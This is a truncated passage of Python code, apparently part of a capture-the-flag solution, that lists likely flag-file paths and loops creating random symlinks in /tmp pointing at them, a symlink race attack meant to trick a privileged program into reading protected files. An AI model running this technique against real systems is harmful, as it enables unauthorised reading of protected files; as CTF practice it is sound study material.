        '/app/flag.txt',
        '/flag.txt',
        '/root/flag.txt',
        '/home/ctf/flag.txt'
    ]

    while True:
        for target in possible_files:
            try:
                random_name = ''.join(random.choices(string.ascii_letters, k=8))
                symlink_path = f'/tmp/test{random_name}'
                os.symlink(target, symlink_path)
